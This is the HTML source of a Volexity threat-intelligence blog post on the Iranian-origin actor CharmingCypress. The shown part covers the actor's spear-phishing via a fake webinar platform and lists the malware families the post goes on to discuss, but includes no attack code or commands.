<!DOCTYPE html>
<!--[if lt IE 7 ]> <html lang="en-US" class="ie ie6 lte9 lte8 lte7 lte6 no-js"> <![endif]-->
<!--[if IE 7 ]>    <html lang="en-US" class="ie ie7 lte9 lte8 lte7 no-js"> <![endif]-->
<!--[if IE 8 ]>    <html lang="en-US" class="ie ie8 lte9 lte8 no-js"> <![endif]-->
<!--[if IE 9 ]>    <html lang="en-US" class="ie ie9 lte9 no-js"> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en-US" class="no-js"> <!--<![endif]-->
<meta charset="UTF-8">
<title>CharmingCypress: Innovating Persistence | Volexity</title>
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="cleartype" content="on">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@Volexity">
<meta name="twitter:creator" content="@Volexity">

<meta name="twitter:title" content="CharmingCypress: Innovating Persistence">

<meta name="twitter:description" content="Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor CharmingCypress (aka Charming Kitten, APT42, TA453). Volexity assesses that CharmingCypress is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists. In their phishing campaigns, CharmingCypress often employs unusual social-engineering tactics, such as engaging targets in prolonged conversations over email before sending links to malicious content. In a particularly notable spear-phishing campaign observed by Volexity, CharmingCypress went so far as to craft an entirely fake webinar platform to use as part of the lure. CharmingCypress controlled access to this platform, requiring targets to install malware-laden VPN applications prior to granting access. Note: Some content in this blog was recently discussed in Microsoft’s report, New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and [&hellip;]">

	<meta name="twitter:image" content="https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png">
	
<link rel="apple-touch-icon" sizes="180x180" href="https://www.volexity.com/wp-content/themes/volexity/apple-touch-icon.png">
<link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon-16x16.png" sizes="16x16">
<link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon.ico">
<link rel="manifest" href="https://www.volexity.com/wp-content/themes/volexity/manifest.json">
<meta name="theme-color" content="#12BEF0">

<meta property="og:image" content="https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence-300x157.png" />

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-WRSX85NK29"></script>
<script>
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-WRSX85NK29');
</script>

	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO Premium plugin v22.5 (Yoast SEO v23.3) - https://yoast.com/wordpress/plugins/seo/ -->
	<meta name="description" content="Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor CharmingCypress (aka Charming Kitten, APT42, TA453). Volexity assesses that CharmingCypress is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists." />
	<link rel="canonical" href="https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="CharmingCypress: Innovating Persistence" />
	<meta property="og:description" content="Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor CharmingCypress (aka Charming Kitten, APT42, TA453). Volexity assesses that CharmingCypress is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists." />
	<meta property="og:url" content="https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/" />
	<meta property="og:site_name" content="Volexity" />
	<meta property="article:publisher" content="https://www.facebook.com/volexity/" />
	<meta property="article:published_time" content="2024-02-13T14:47:15+00:00" />
	<meta property="article:modified_time" content="2024-02-15T09:11:36+00:00" />
	<meta property="og:image" content="https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png" />
	<meta property="og:image:width" content="2060" />
	<meta property="og:image:height" content="1076" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="Volexity" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/#article","isPartOf":{"@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/"},"author":{"name":"Volexity","@id":"https://www.volexity.com/#/schema/person/3159370c7fbbe719c11e41aeb6353ae1"},"headline":"CharmingCypress: Innovating Persistence","datePublished":"2024-02-13T14:47:15+00:00","dateModified":"2024-02-15T09:11:36+00:00","mainEntityOfPage":{"@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/"},"wordCount":3099,"publisher":{"@id":"https://www.volexity.com/#organization"},"image":{"@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/#primaryimage"},"thumbnailUrl":"https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png","keywords":["APT","apt42","charming kitten","charmingcypress","iran","memory analysis","memory forensics","phishing","ta453","volexity volcano"],"articleSection":["APT","Iran"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/","url":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/","name":"CharmingCypress: Innovating Persistence | Volexity","isPartOf":{"@id":"https://www.volexity.com/#website"},"primaryImageOfPage":{"@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/#primaryimage"},"image":{"@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/#primaryimage"},"thumbnailUrl":"https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png","datePublished":"2024-02-13T14:47:15+00:00","dateModified":"2024-02-15T09:11:36+00:00","description":"Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor CharmingCypress (aka Charming Kitten, APT42, TA453). Volexity assesses that CharmingCypress is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists.","breadcrumb":{"@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/#primaryimage","url":"https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png","contentUrl":"https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png","width":2060,"height":1076,"caption":"Volexity-CharmingCypress-Innovating-Persistence"},{"@type":"BreadcrumbList","@id":"https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.volexity.com/"},{"@type":"ListItem","position":2,"name":"Blog","item":"https://www.volexity.com/blog/"},{"@type":"ListItem","position":3,"name":"CharmingCypress: Innovating Persistence"}]},{"@type":"WebSite","@id":"https://www.volexity.com/#website","url":"https://www.volexity.com/","name":"Volexity | Memory Forensics, Cybersecurity Threat Intelligence & Incident Response","description":"","publisher":{"@id":"https://www.volexity.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.volexity.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://www.volexity.com/#organization","name":"Volexity Inc.","alternateName":"Volexity - Forensic Memory Analysis","url":"https://www.volexity.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.volexity.com/#/schema/logo/image/","url":"https://www.volexity.com/wp-content/uploads/2018/01/Volexity-Logo-Full-Stacked-2019-1000px.jpg","contentUrl":"https://www.volexity.com/wp-content/uploads/2018/01/Volexity-Logo-Full-Stacked-2019-1000px.jpg","width":1000,"height":1000,"caption":"Volexity Inc."},"image":{"@id":"https://www.volexity.com/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/volexity/","https://x.com/Volexity","https://www.linkedin.com/company/volexity/","https://github.com/volexity","https://infosec.exchange/@volexity"]},{"@type":"Person","@id":"https://www.volexity.com/#/schema/person/3159370c7fbbe719c11e41aeb6353ae1","name":"Volexity","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.volexity.com/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/757082c7e4105ce43a92a48f14f581c2?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/757082c7e4105ce43a92a48f14f581c2?s=96&d=mm&r=g","caption":"Volexity"}}]}</script>
	<!-- / Yoast SEO Premium plugin. -->


<link rel='stylesheet' id='wp-block-library-css' href='https://www.volexity.com/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='cookie-notice-front-css' href='https://www.volexity.com/wp-content/plugins/cookie-notice/css/front.min.css?ver=2.4.18' type='text/css' media='all' />
<link rel='stylesheet' id='main-style-css' href='https://www.volexity.com/wp-content/themes/volexity/dist/styles/styles.min.css?ver=6.6.2' type='text/css' media='screen, print' />
<script type="text/javascript" id="cookie-notice-front-js-before">
/* <![CDATA[ */
var cnArgs = {"ajaxUrl":"https:\/\/www.volexity.com\/wp-admin\/admin-ajax.php","nonce":"28d5be066c","hideEffect":"fade","position":"bottom","onScroll":false,"onScrollOffset":100,"onClick":false,"cookieName":"cookie_notice_accepted","cookieTime":2592000,"cookieTimeRejected":2592000,"globalCookie":false,"redirection":false,"cache":false,"revokeCookies":false,"revokeCookiesOpt":"automatic"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.volexity.com/wp-content/plugins/cookie-notice/js/front.min.js?ver=2.4.18" id="cookie-notice-front-js"></script>
<script type="text/javascript" src="https://www.volexity.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://www.volexity.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://www.volexity.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.volexity.com/wp-json/wp/v2/posts/3150" /><link rel='shortlink' href='https://www.volexity.com/?p=3150' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.volexity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.volexity.com%2Fblog%2F2024%2F02%2F13%2Fcharmingcypress-innovating-persistence%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.volexity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.volexity.com%2Fblog%2F2024%2F02%2F13%2Fcharmingcypress-innovating-persistence%2F&#038;format=xml" />
		<style type="text/css" id="wp-custom-css">
			/*
You can add your own CSS here.

Click the help icon above to learn more.
*/		</style>
		
	<!--[if lte IE 9 ]>
		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/selectivizr.js"></script>
		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/respond.js"></script>
		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/mediamatch.js"></script>
	<![endif]-->
</head>
<body class="post-template-default single single-post postid-3150 single-format-standard cookies-not-set chrome windows">
	<header class="header">
    <div class="header-top-container">
        <div class="container">
            <ul id="menu-sub-left" class="header-sub-left"><li id="menu-item-2116" class="icon-triangle menu-item menu-item-type-post_type menu-item-object-page menu-item-2116"><a href="https://www.volexity.com/company/contact/demo-request/" class="icon-triangle">Request A Demo</a></li>
</ul>            <ul id="menu-sub-right" class="header-sub-right"><li id="menu-item-1213" class="icon-warning menu-item menu-item-type-post_type menu-item-object-page menu-item-1213"><a href="https://www.volexity.com/company/contact/breach-assistance/" class="icon-warning">Breach Assistance</a></li>
</ul>        </div>
    </div>
	<div class="header-container">
        <div class="container">
            <a class="header-logo" href="https://www.volexity.com"><img src="https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png" alt="Volexity"></a>
            <div class="header-menu">
                <ul id="menu-main-navigation" class="header-menu-list"><li id="menu-item-376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-376"><a href="https://www.volexity.com/products-overview/">Products</a>
<ul class="sub-menu">
	<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="https://www.volexity.com/products-overview/">Products Overview</a></li>
	<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.volexity.com/products-overview/volcano/">Volcano</a></li>
	<li id="menu-item-49" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-49"><a href="https://www.volexity.com/products-overview/surge/">Surge</a></li>
</ul>
</li>
<li id="menu-item-377" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-377"><a href="https://www.volexity.com/services-overview/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-55" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-55"><a href="https://www.volexity.com/services-overview/">Services Overview</a></li>
	<li id="menu-item-52" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52"><a href="https://www.volexity.com/services-overview/incident-response/">Incident Response</a></li>
	<li id="menu-item-53" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-53"><a href="https://www.volexity.com/services-overview/network-security-monitoring/">Network Security Monitoring</a></li>
	<li id="menu-item-54" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54"><a href="https://www.volexity.com/services-overview/proactive-threat-assessments/">Proactive Threat Assessments</a></li>
	<li id="menu-item-56" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-56"><a href="https://www.volexity.com/services-overview/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-2394" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2394"><a href="https://www.volexity.com/services-overview/mergers-acquisitions-cybersecurity-assessments/">M&#038;A Cybersecurity Assessments</a></li>
</ul>
</li>
<li id="menu-item-385" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-385"><a href="https://www.volexity.com/company/about/">Company</a>
<ul class="sub-menu">
	<li id="menu-item-41" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-41"><a href="https://www.volexity.com/company/about/">About</a></li>
	<li id="menu-item-43" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43"><a href="https://www.volexity.com/company/news-press/">News &#038; Press</a></li>
	<li id="menu-item-1849" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1849"><a href="https://www.volexity.com/company/careers/">Careers</a></li>
	<li id="menu-item-1824" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1824"><a href="https://www.volexity.com/company/internships/">Internships</a></li>
	<li id="menu-item-1718" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1718"><a href="https://www.volexity.com/company/resources/">Resources</a></li>
</ul>
</li>
<li id="menu-item-39" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-39"><a href="https://www.volexity.com/blog/">Blog</a></li>
<li id="menu-item-45" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45"><a href="https://www.volexity.com/company/contact/">Contact</a></li>
</ul>            </div>
            <div class="mobile-menu--holder">
                <div class="mobile-menu"></div>
            </div>
        </div>
	</div>
</header>
<div class="int-header s5">
    <div class="container">
        <section class="int-header-hold col-sm-12">
            blog        </section>
    </div>
</div>
	<main class="main">
		<div class="container">
	<section class="row int">
		<article class="col-sm-8">
			<div class="post-content composition">
				<h2 class="post-title">CharmingCypress: Innovating Persistence</h2>
				<p class="post-date">February 13, 2024</p>
									<p class="post-byline">by Ankur Saini, Callum Roxan, Charlie Gardner, Damien Cash</p>
					
				<div class="post-single-social">
		      <a class="post-single-social-share" data-share-channel="facebook" data-title="CharmingCypress: Innovating Persistence" data-description="Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor CharmingCypress (aka Charming Kitten, APT42, TA453). Volexity assesses that CharmingCypress is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists. In their phishing campaigns, CharmingCypress often employs unusual social-engineering tactics, such as engaging targets in prolonged conversations over email before sending links to malicious content. In a particularly notable spear-phishing campaign observed by Volexity, CharmingCypress went so far as to craft an entirely fake webinar platform to use as part of the lure. CharmingCypress controlled access to this platform, requiring targets to install malware-laden VPN applications prior to granting access. Note: Some content in this blog was recently discussed in Microsoft’s report, New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and [&hellip;]" data-url="https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/" data-image="" data-caption="Volexity"><i class="icon icon-facebook-share"></i><span class="sr-only">Facebook</span></a>
		      <a class="post-single-social-share" data-share-channel="twitter" data-text="CharmingCypress%3A+Innovating+Persistence" data-url="https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/" data-hashtags="volexity" data-via="Volexity"><i class="icon icon-twitter-share"></i><span class="sr-only">Twitter</span></a>
		      <a class="post-single-social-share" data-share-channel="email" data-post-id="3150"><i class="icon icon-mail-share"></i><span class="sr-only">Email</span></a>
			  </div>
				<p><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-3151" src="https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png" alt="Volexity-CharmingCypress-Innovating-Persistence" width="2060" height="1076" srcset="https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence.png 2060w, https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence-300x157.png 300w, https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence-1024x535.png 1024w, https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence-768x401.png 768w, https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence-1536x802.png 1536w, https://www.volexity.com/wp-content/uploads/2024/02/Volexity-CharmingCypress-Innovating-Persistence-2048x1070.png 2048w" sizes="(max-width: 2060px) 100vw, 2060px" /></p>
<p style="font-weight: 400;">Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor CharmingCypress (aka Charming Kitten, APT42, TA453). Volexity assesses that CharmingCypress is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists.</p>
<p style="font-weight: 400;">In their phishing campaigns, CharmingCypress often employs unusual social-engineering tactics, such as engaging targets in prolonged conversations over email before sending links to malicious content. In a particularly notable spear-phishing campaign observed by Volexity, CharmingCypress went so far as to craft an entirely fake webinar platform to use as part of the lure. CharmingCypress controlled access to this platform, requiring targets to install malware-laden VPN applications prior to granting access.</p>
<p style="font-weight: 400;"><em>Note: Some content in this blog was recently discussed in Microsoft’s report, </em><a href="https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"><em>New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and research orgs</em></a><em>.</em></p>
<h3>Malware Families Associated with CharmingCypress</h3>
<p style="font-weight: 400;">This blog post serves as a public reference regarding tools Volexity has observed in use by CharmingCypress throughout 2023 and into early 2024 including details on techniques the threat actor has used to distribute them. The following malware families are discussed in this post:</p>
<ul>
<li>POWERSTAR</li>
<li>POWERLESS</li>
<li>NOKNOK</li>
<li>BASICSTAR</li>
<li>EYEGLASS</li>
</ul>
